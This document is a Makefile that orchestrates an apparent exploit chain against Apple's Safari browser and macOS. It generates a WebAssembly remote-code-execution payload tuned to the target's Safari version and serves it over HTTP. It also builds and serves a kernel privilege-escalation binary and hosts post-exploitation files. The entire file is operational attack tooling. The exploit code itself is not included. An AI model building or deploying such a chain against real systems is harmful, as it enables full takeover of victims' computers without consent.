# set pipefail so piped commands' errors arent ignored
SHELL = /bin/bash -o pipefail

SCFLAGS = -Wall -c -Os -fno-stack-protector -mno-sse -fno-unwind-tables -fno-exceptions

.PHONY: help
help:
	@echo "servers:"
	@echo '  `make rce IP=<thrower ip>` to build/serve rce'
	@echo '  `make stage2` to serve stage2 eop'
	@echo '  `make postexploit` to serve post-exploit files'
	@echo ''
	@echo 'rebuilding:'
	@echo '  `make rce-build` to re-determine jsc offsets (must have same version of Safari as target machine)'
	@echo '  `make stage2-build` to recompile eop from source'
	@echo '  `make stage2-build HIB=1` to recompile eop from source using __HIB version'
	@echo '  `make postexploit-build` to recompile post-exploit from source'
	@echo '  `make rebuild` to rebuild all 3'

.PHONY: rce
rce: ip
	cd rce && python3 gen_wasm.py -ip $(IP) && python3 -m http.server 1717

.PHONY: ip
ip:
ifndef IP
	$(error server IP not set, run make IP=...)
endif

.PHONY: stage2
stage2:
	cd rce && python3 stage2_server.py ../eop.bin

.PHONY: postexploit
postexploit:
	cd eop/postexploit && python3 -m http.server 5151

.PHONY: rce-build
rce-build:
	cd rce && python3 gen_wasm.py -offs prod

.PHONY: stage2-build
stage2-build:
	make -C eop ksc
	clang -E eop.c | sed $$'s/__NLHASH__/\\\n#/g' | clang -x c - -o eop.o $(SCFLAGS)
	clang -E eop$(if $(HIB),_hib,)/eop_common.c -DFULLCHAIN | sed $$'s/__NLHASH__/\\\n#/g' | clang -x c - -o eop_common.o $(SCFLAGS)
	ld eop.o eop_common.o -o eop.dylib -dylib
	python objcopy.py eop.dylib eop.bin
	rm eop.o eop.dylib eop_common.o

.PHONY: postexploit-build
postexploit-build:
	cd eop/postexploit && make

.PHONY: rebuild
rebuild: rce-build stage2-build postexploit-build
